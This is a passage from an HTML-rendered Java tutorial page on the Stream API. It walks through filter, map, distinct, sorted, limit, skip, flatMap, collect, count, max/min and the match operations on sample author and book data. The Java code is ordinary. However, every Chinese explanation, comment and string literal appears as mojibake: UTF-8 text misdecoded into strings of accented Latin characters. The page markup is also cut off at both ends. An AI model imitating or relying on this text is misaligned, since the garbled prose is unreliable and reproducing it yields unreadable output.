class="hljs-string">&quot;ä¸¤ä¸ªå“²å­¦å®¶çµé­‚å’Œè‚‰ä½“çš„ç¢°æ’ä¼šæ¿€èµ·æ€ä¹ˆæ ·çš„ç«èŠ±å‘¢ï¼Ÿ&quot;</span>));<br><br>    author.setBooks(books1);<br>    author2.setBooks(books2);<br>    author3.setBooks(books3);<br>    author4.setBooks(books3);<br><br>    List&lt;Author&gt; authorList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(Arrays.asList(author,author2,author3,author4));<br>    <span class="hljs-keyword">return</span> authorList;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="33-å¿«é€Ÿå…¥é—¨"><a class="markdownIt-Anchor" href="#33-å¿«é€Ÿå…¥é—¨"></a> 3.3 å¿«é€Ÿå…¥é—¨</h3><h4 id="331-éœ€æ±‚"><a class="markdownIt-Anchor" href="#331-éœ€æ±‚"></a> 3.3.1 éœ€æ±‚</h4><p>â€‹æˆ‘ä»¬å¯ä»¥è°ƒç”¨getAuthorsæ–¹æ³•è·å–åˆ°ä½œå®¶çš„é›†åˆã€‚ç°åœ¨éœ€è¦æ‰“å°æ‰€æœ‰å¹´é¾„å°äº18çš„ä½œå®¶çš„åå­—ï¼Œå¹¶ä¸”è¦æ³¨æ„å»é‡ã€‚</p><h4 id="332-å®ç°"><a class="markdownIt-Anchor" href="#332-å®ç°"></a> 3.3.2 å®ç°</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æ‰“å°æ‰€æœ‰å¹´é¾„å°äº18çš„ä½œå®¶çš„åå­—ï¼Œå¹¶ä¸”è¦æ³¨æ„å»é‡</span><br>List&lt;Author&gt; authors = getAuthors();<br>authors.<br>        stream()<span class="hljs-comment">//æŠŠé›†åˆè½¬æ¢æˆæµ</span><br>        .distinct()<span class="hljs-comment">//å…ˆå»é™¤é‡å¤çš„ä½œå®¶</span><br>        .filter(author -&gt; author.getAge()&lt;<span class="hljs-number">18</span>)<span class="hljs-comment">//ç­›é€‰å¹´é¾„å°äº18çš„</span><br>        .forEach(author -&gt; System.out.println(author.getName()));<span class="hljs-comment">//éå†æ‰“å°åå­—</span><br></code></pre></td></tr></table></figure><h3 id="34-å¸¸ç”¨æ“ä½œ"><a class="markdownIt-Anchor" href="#34-å¸¸ç”¨æ“ä½œ"></a> 3.4 å¸¸ç”¨æ“ä½œ</h3><h4 id="341-åˆ›å»ºæµ"><a class="markdownIt-Anchor" href="#341-åˆ›å»ºæµ"></a> 3.4.1 åˆ›å»ºæµ</h4><p>å•åˆ—é›†åˆï¼š <code>é›†åˆå¯¹è±¡.stream()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">      List&lt;Author&gt; authors = getAuthors();<br>Stream&lt;Author&gt; stream = authors.stream();<br></code></pre></td></tr></table></figure><p>æ•°ç»„ï¼š<code>Arrays.stream(æ•°ç»„)</code>æˆ–è€…ä½¿ç”¨<code>Stream.of</code>æ¥åˆ›å»º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">Integer[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br>Stream&lt;Integer&gt; stream = Arrays.stream(arr);<br>Stream&lt;Integer&gt; stream2 = Stream.of(arr);<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„</p></blockquote><p><code>Stream.of</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] ints = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>Stream&lt;<span class="hljs-type">int</span>[]&gt; ints1 = Stream.of(ints);<br><span class="hljs-type">IntStream</span> <span class="hljs-variable">stream1</span> <span class="hljs-operator">=</span> Arrays.stream(ints);<br><br>Integer[] integers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>[<span class="hljs-number">10</span>];<br>Stream&lt;Integer&gt; integerStream = Stream.of(integers);<br>Stream&lt;Integer&gt; stream2 = Arrays.stream(integers);<br></code></pre></td></tr></table></figure><p>åŒåˆ—é›†åˆï¼šè½¬æ¢æˆå•åˆ—é›†åˆåå†åˆ›å»º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String,Integer&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-string">&quot;èœ¡ç¬”å°æ–°&quot;</span>,<span class="hljs-number">19</span>);<br>map.put(<span class="hljs-string">&quot;é»‘å­&quot;</span>,<span class="hljs-number">17</span>);<br>map.put(<span class="hljs-string">&quot;æ—¥å‘ç¿”é˜³&quot;</span>,<span class="hljs-number">16</span>);<br><br>Stream&lt;Map.Entry&lt;String, Integer&gt;&gt; stream = map.entrySet().stream();<br></code></pre></td></tr></table></figure><h4 id="342-ä¸­é—´æ“ä½œ"><a class="markdownIt-Anchor" href="#342-ä¸­é—´æ“ä½œ"></a> 3.4.2 ä¸­é—´æ“ä½œ</h4><h5 id="filter"><a class="markdownIt-Anchor" href="#filter"></a> filter</h5><p>â€‹å¯ä»¥å¯¹æµä¸­çš„å…ƒç´ è¿›è¡Œæ¡ä»¶è¿‡æ»¤ï¼Œç¬¦åˆè¿‡æ»¤æ¡ä»¶çš„æ‰èƒ½ç»§ç»­ç•™åœ¨æµä¸­ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>â€‹æ‰“å°æ‰€æœ‰å§“åé•¿åº¦å¤§äº1çš„ä½œå®¶çš„å§“å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.stream()<br>        .filter(author -&gt; author.getName().length()&gt;<span class="hljs-number">1</span>)<br>        .forEach(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><h5 id="map"><a class="markdownIt-Anchor" href="#map"></a> map</h5><p>â€‹å¯ä»¥æŠŠå¯¹æµä¸­çš„å…ƒç´ è¿›è¡Œè®¡ç®—æˆ–è½¬æ¢ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>â€‹æ‰“å°æ‰€æœ‰ä½œå®¶çš„å§“å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br><br>authors<br>        .stream()<br>        .map(author -&gt; author.getName())<br>        .forEach(name-&gt;System.out.println(name));<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        æ‰“å°æ‰€æœ‰ä½œå®¶çš„å§“å</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br><span class="hljs-comment">//        authors.stream()</span><br><span class="hljs-comment">//                .map(author -&gt; author.getName())</span><br><span class="hljs-comment">//                .forEach(s -&gt; System.out.println(s));</span><br><br>        authors.stream()<br>                .map(author -&gt; author.getAge())<br>                .map(age-&gt;age+<span class="hljs-number">10</span>)<br>                .forEach(age-&gt; System.out.println(age));<br></code></pre></td></tr></table></figure><h5 id="distinct"><a class="markdownIt-Anchor" href="#distinct"></a> distinct</h5><p>â€‹å¯ä»¥å»é™¤æµä¸­çš„é‡å¤å…ƒç´ ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>â€‹æ‰“å°æ‰€æœ‰ä½œå®¶çš„å§“åï¼Œå¹¶ä¸”è¦æ±‚å…¶ä¸­ä¸èƒ½æœ‰é‡å¤å…ƒç´ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.stream()<br>        .distinct()<br>        .forEach(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šdistinctæ–¹æ³•æ˜¯ä¾èµ–Objectçš„equalsæ–¹æ³•æ¥åˆ¤æ–­æ˜¯å¦æ˜¯ç›¸åŒå¯¹è±¡çš„ã€‚æ‰€ä»¥éœ€è¦æ³¨æ„é‡å†™equalsæ–¹æ³•ã€‚</strong></p><h5 id="sorted"><a class="markdownIt-Anchor" href="#sorted"></a> sorted</h5><p>â€‹å¯ä»¥å¯¹æµä¸­çš„å…ƒç´ è¿›è¡Œæ’åºã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>â€‹å¯¹æµä¸­çš„å…ƒç´ æŒ‰ç…§å¹´é¾„è¿›è¡Œé™åºæ’åºï¼Œå¹¶ä¸”è¦æ±‚ä¸èƒ½æœ‰é‡å¤çš„å…ƒç´ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">        List&lt;Author&gt; authors = getAuthors();<br><span class="hljs-comment">//        å¯¹æµä¸­çš„å…ƒç´ æŒ‰ç…§å¹´é¾„è¿›è¡Œé™åºæ’åºï¼Œå¹¶ä¸”è¦æ±‚ä¸èƒ½æœ‰é‡å¤çš„å…ƒç´ ã€‚</span><br>        authors.stream()<br>                .distinct()<br>                .sorted()<br>                .forEach(author -&gt; System.out.println(author.getAge()));<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">        List&lt;Author&gt; authors = getAuthors();<br><span class="hljs-comment">//        å¯¹æµä¸­çš„å…ƒç´ æŒ‰ç…§å¹´é¾„è¿›è¡Œé™åºæ’åºï¼Œå¹¶ä¸”è¦æ±‚ä¸èƒ½æœ‰é‡å¤çš„å…ƒç´ ã€‚</span><br>        authors.stream()<br>                .distinct()<br>                .sorted((o1, o2) -&gt; o2.getAge()-o1.getAge())<br>                .forEach(author -&gt; System.out.println(author.getAge()));<br></code></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šå¦‚æœè°ƒç”¨ç©ºå‚çš„sorted()æ–¹æ³•ï¼Œéœ€è¦æµä¸­çš„å…ƒç´ æ˜¯å®ç°äº†Comparableã€‚</strong></p><p>â€‹</p><h5 id="limit"><a class="markdownIt-Anchor" href="#limit"></a> limit</h5><p>â€‹å¯ä»¥è®¾ç½®æµçš„æœ€å¤§é•¿åº¦ï¼Œè¶…å‡ºçš„éƒ¨åˆ†å°†è¢«æŠ›å¼ƒã€‚</p><p>ä¾‹å¦‚ï¼š</p><p>â€‹å¯¹æµä¸­çš„å…ƒç´ æŒ‰ç…§å¹´é¾„è¿›è¡Œé™åºæ’åºï¼Œå¹¶ä¸”è¦æ±‚ä¸èƒ½æœ‰é‡å¤çš„å…ƒç´ ,ç„¶åæ‰“å°å…¶ä¸­å¹´é¾„æœ€å¤§çš„ä¸¤ä¸ªä½œå®¶çš„å§“åã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.stream()<br>        .distinct()<br>        .sorted()<br>        .limit(<span class="hljs-number">2</span>)<br>        .forEach(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><h5 id="skip"><a class="markdownIt-Anchor" href="#skip"></a> skip</h5><p>â€‹è·³è¿‡æµä¸­çš„å‰nä¸ªå…ƒç´ ï¼Œè¿”å›å‰©ä¸‹çš„å…ƒç´ </p><p>ä¾‹å¦‚ï¼š</p><p>â€‹æ‰“å°é™¤äº†å¹´é¾„æœ€å¤§çš„ä½œå®¶å¤–çš„å…¶ä»–ä½œå®¶ï¼Œè¦æ±‚ä¸èƒ½æœ‰é‡å¤å…ƒç´ ï¼Œå¹¶ä¸”æŒ‰ç…§å¹´é¾„é™åºæ’åºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        æ‰“å°é™¤äº†å¹´é¾„æœ€å¤§çš„ä½œå®¶å¤–çš„å…¶ä»–ä½œå®¶ï¼Œè¦æ±‚ä¸èƒ½æœ‰é‡å¤å…ƒç´ ï¼Œå¹¶ä¸”æŒ‰ç…§å¹´é¾„é™åºæ’åºã€‚</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        authors.stream()<br>                .distinct()<br>                .sorted()<br>                .skip(<span class="hljs-number">1</span>)<br>                .forEach(author -&gt; System.out.println(author.getName()));<br></code></pre></td></tr></table></figure><h5 id="flatmap"><a class="markdownIt-Anchor" href="#flatmap"></a> flatMap</h5><p>â€‹mapåªèƒ½æŠŠä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡æ¥ä½œä¸ºæµä¸­çš„å…ƒç´ ã€‚è€ŒflatMapå¯ä»¥æŠŠä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå¤šä¸ªå¯¹è±¡ä½œä¸ºæµä¸­çš„å…ƒç´ ã€‚</p><p>ä¾‹ä¸€ï¼š</p><p>â€‹æ‰“å°æ‰€æœ‰ä¹¦ç±çš„åå­—ã€‚è¦æ±‚å¯¹é‡å¤çš„å…ƒç´ è¿›è¡Œå»é‡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        æ‰“å°æ‰€æœ‰ä¹¦ç±çš„åå­—ã€‚è¦æ±‚å¯¹é‡å¤çš„å…ƒç´ è¿›è¡Œå»é‡ã€‚</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br>        authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .distinct()<br>                .forEach(book -&gt; System.out.println(book.getName()));<br></code></pre></td></tr></table></figure><p>ä¾‹äºŒï¼š</p><p>â€‹æ‰“å°ç°æœ‰æ•°æ®çš„æ‰€æœ‰åˆ†ç±»ã€‚è¦æ±‚å¯¹åˆ†ç±»è¿›è¡Œå»é‡ã€‚ä¸èƒ½å‡ºç°è¿™ç§æ ¼å¼ï¼šå“²å­¦,çˆ±æƒ…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        æ‰“å°ç°æœ‰æ•°æ®çš„æ‰€æœ‰åˆ†ç±»ã€‚è¦æ±‚å¯¹åˆ†ç±»è¿›è¡Œå»é‡ã€‚ä¸èƒ½å‡ºç°è¿™ç§æ ¼å¼ï¼šå“²å­¦,çˆ±æƒ…     çˆ±æƒ…</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .distinct()<br>                .flatMap(book -&gt; Arrays.stream(book.getCategory().split(<span class="hljs-string">&quot;,&quot;</span>)))<br>                .distinct()<br>                .forEach(category-&gt; System.out.println(category));<br></code></pre></td></tr></table></figure><h4 id="343-ç»ˆç»“æ“ä½œ"><a class="markdownIt-Anchor" href="#343-ç»ˆç»“æ“ä½œ"></a> 3.4.3 ç»ˆç»“æ“ä½œ</h4><h5 id="foreach"><a class="markdownIt-Anchor" href="#foreach"></a> forEach</h5><p>â€‹å¯¹æµä¸­çš„å…ƒç´ è¿›è¡Œéå†æ“ä½œï¼Œæˆ‘ä»¬é€šè¿‡ä¼ å…¥çš„å‚æ•°å»æŒ‡å®šå¯¹éå†åˆ°çš„å…ƒç´ è¿›è¡Œä»€ä¹ˆå…·ä½“æ“ä½œã€‚</p><p>ä¾‹å­ï¼š</p><p>â€‹è¾“å‡ºæ‰€æœ‰ä½œå®¶çš„åå­—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        è¾“å‡ºæ‰€æœ‰ä½œå®¶çš„åå­—</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br>        authors.stream()<br>                .map(author -&gt; author.getName())<br>                .distinct()<br>                .forEach(name-&gt; System.out.println(name));<br><br></code></pre></td></tr></table></figure><h5 id="count"><a class="markdownIt-Anchor" href="#count"></a> count</h5><p>â€‹å¯ä»¥ç”¨æ¥è·å–å½“å‰æµä¸­å…ƒç´ çš„ä¸ªæ•°ã€‚</p><p>ä¾‹å­ï¼š</p><p>â€‹æ‰“å°è¿™äº›ä½œå®¶çš„æ‰€å‡ºä¹¦ç±çš„æ•°ç›®ï¼Œæ³¨æ„åˆ é™¤é‡å¤å…ƒç´ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        æ‰“å°è¿™äº›ä½œå®¶çš„æ‰€å‡ºä¹¦ç±çš„æ•°ç›®ï¼Œæ³¨æ„åˆ é™¤é‡å¤å…ƒç´ ã€‚</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br>        <span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .distinct()<br>                .count();<br>        System.out.println(count);<br></code></pre></td></tr></table></figure><h5 id="maxmin"><a class="markdownIt-Anchor" href="#maxmin"></a> max&amp;min</h5><p>â€‹å¯ä»¥ç”¨æ¥æˆ–è€…æµä¸­çš„æœ€å€¼ã€‚</p><p>ä¾‹å­ï¼š</p><p>â€‹åˆ†åˆ«è·å–è¿™äº›ä½œå®¶çš„æ‰€å‡ºä¹¦ç±çš„æœ€é«˜åˆ†å’Œæœ€ä½åˆ†å¹¶æ‰“å°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        åˆ†åˆ«è·å–è¿™äº›ä½œå®¶çš„æ‰€å‡ºä¹¦ç±çš„æœ€é«˜åˆ†å’Œæœ€ä½åˆ†å¹¶æ‰“å°ã€‚</span><br>        <span class="hljs-comment">//Stream&lt;Author&gt;  -&gt; Stream&lt;Book&gt; -&gt;Stream&lt;Integer&gt;  -&gt;æ±‚å€¼</span><br><br>        List&lt;Author&gt; authors = getAuthors();<br>        Optional&lt;Integer&gt; max = authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .map(book -&gt; book.getScore())<br>                .max((score1, score2) -&gt; score1 - score2);<br><br>        Optional&lt;Integer&gt; min = authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .map(book -&gt; book.getScore())<br>                .min((score1, score2) -&gt; score1 - score2);<br>        System.out.println(max.get());<br>        System.out.println(min.get());<br></code></pre></td></tr></table></figure><p>ä¾‹å­ï¼š</p><p>â€‹æ•°ç»„è·å–æœ€å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Test_4</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span>[] ints = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; ints.length; i++) &#123;<br>                ints[i] = i;<br>        &#125;<br>        System.out.println(Arrays.stream(ints).max().getAsInt());<br>        System.out.println(Arrays.stream(ints).min().getAsInt());<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„</p></blockquote><p>åŸºæœ¬ç±»å‹ä¸å®ƒçš„å§åŒ…è£…ç±»å‹å¯ä»¥è°ƒç”¨ç©ºå‚çš„<code>max&amp;min()</code>æ–¹æ³•ã€‚</p><p>å…¶ä»–çš„ä¸è¡Œã€‚å®ç°äº† <strong>Comparable</strong>  <strong>Comparator</strong>è¿˜æ˜¯ä¸€æ ·</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221221144815244.png" alt="image-20221221144815244" /></p><h5 id="collect"><a class="markdownIt-Anchor" href="#collect"></a> collect</h5><p>â€‹æŠŠå½“å‰æµè½¬æ¢æˆä¸€ä¸ªé›†åˆã€‚</p><p>ä¾‹å­ï¼š</p><p>â€‹è·å–ä¸€ä¸ªå­˜æ”¾æ‰€æœ‰ä½œè€…åå­—çš„Listé›†åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        è·å–ä¸€ä¸ªå­˜æ”¾æ‰€æœ‰ä½œè€…åå­—çš„Listé›†åˆã€‚</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        List&lt;String&gt; nameList = authors.stream()<br>                .map(author -&gt; author.getName())<br>                .collect(Collectors.toList());<br>        System.out.println(nameList);<br></code></pre></td></tr></table></figure><p>â€‹è·å–ä¸€ä¸ªæ‰€æœ‰ä¹¦åçš„Seté›†åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        è·å–ä¸€ä¸ªæ‰€æœ‰ä¹¦åçš„Seté›†åˆã€‚</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        Set&lt;Book&gt; books = authors.stream()<br>                .flatMap(author -&gt; author.getBooks().stream())<br>                .collect(Collectors.toSet());<br><br>        System.out.println(books);<br></code></pre></td></tr></table></figure><p>â€‹è·å–ä¸€ä¸ªMapé›†åˆï¼Œmapçš„keyä¸ºä½œè€…åï¼Œvalueä¸ºList<Book></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        è·å–ä¸€ä¸ªMapé›†åˆï¼Œmapçš„keyä¸ºä½œè€…åï¼Œvalueä¸ºList&lt;Book&gt;</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br>        Map&lt;String, List&lt;Book&gt;&gt; map = authors.stream()<br>                .distinct()<br>                .collect(Collectors.toMap(author -&gt; author.getName(), author -&gt; author.getBooks()));<br><br>        System.out.println(map);<br></code></pre></td></tr></table></figure><h5 id="æŸ¥æ‰¾ä¸åŒ¹é…"><a class="markdownIt-Anchor" href="#æŸ¥æ‰¾ä¸åŒ¹é…"></a> æŸ¥æ‰¾ä¸åŒ¹é…</h5><h6 id="anymatch"><a class="markdownIt-Anchor" href="#anymatch"></a> anyMatch</h6><p>â€‹å¯ä»¥ç”¨æ¥åˆ¤æ–­æ˜¯å¦æœ‰ä»»æ„ç¬¦åˆåŒ¹é…æ¡ä»¶çš„å…ƒç´ ï¼Œç»“æœä¸ºbooleanç±»å‹ã€‚</p><p>ä¾‹å­ï¼š</p><p>â€‹åˆ¤æ–­æ˜¯å¦æœ‰å¹´é¾„åœ¨29ä»¥ä¸Šçš„ä½œå®¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        åˆ¤æ–­æ˜¯å¦æœ‰å¹´é¾„åœ¨29ä»¥ä¸Šçš„ä½œå®¶</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> authors.stream()<br>                .anyMatch(author -&gt; author.getAge() &gt; <span class="hljs-number">29</span>);<br>        System.out.println(flag);<br></code></pre></td></tr></table></figure><h6 id="allmatch"><a class="markdownIt-Anchor" href="#allmatch"></a> allMatch</h6><p>â€‹å¯ä»¥ç”¨æ¥åˆ¤æ–­æ˜¯å¦éƒ½ç¬¦åˆåŒ¹é…æ¡ä»¶ï¼Œç»“æœä¸ºbooleanç±»å‹ã€‚å¦‚æœéƒ½ç¬¦åˆç»“æœä¸ºtrueï¼Œå¦åˆ™ç»“æœä¸ºfalseã€‚</p><p>ä¾‹å­ï¼š</p><p>â€‹åˆ¤æ–­æ˜¯å¦æ‰€æœ‰çš„ä½œå®¶éƒ½æ˜¯æˆå¹´äºº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        åˆ¤æ–­æ˜¯å¦æ‰€æœ‰çš„ä½œå®¶éƒ½æ˜¯æˆå¹´äºº</span><br>        List&lt;Author&gt; authors = getAuthors();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> authors.stream()<br>                .allMatch(author -&gt; author.getAge() &gt;= <span class="hljs-number">18</span>);<br>        System.out.println(flag);<br></code></pre></td></tr></table></figure><h6 id="nonematch"><a class="markdownIt-Anchor" href="#nonematch"></a> noneMatch</h6><p>â€‹å¯ä»¥åˆ¤æ–­æµä¸­çš„å…ƒç´ æ˜¯å¦éƒ½ä¸ç¬¦åˆåŒ¹é…æ¡ä»¶ã€‚å¦‚æœéƒ½ä¸ç¬¦åˆç»“æœä¸ºtrueï¼Œå¦åˆ™ç»“æœä¸ºfalse</p><p>ä¾‹å­ï¼š</p><p>â€‹åˆ¤æ–­ä½œå®¶æ˜¯å¦éƒ½æ²¡æœ‰è¶…è¿‡100å²çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        åˆ¤æ–­ä½œå®¶æ˜¯å¦éƒ½æ²¡æœ‰è¶…è¿‡100å²çš„ã€‚</span><br>        List&lt;Author&gt; authors = getAuthors();<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> authors.stream()<br>                .noneMatch(author -&gt; author.getAge() &gt; <span class="hljs-number">100</span>);<br><br>        System.out.println(b);<br></code></pre></td></tr></table></figure><h6 id="findany"><a class="markdownIt-Anchor" href="#findany"></a> findAny</h6><p>â€‹è·å–æµä¸­çš„ä»»æ„ä¸€ä¸ªå…ƒç´ 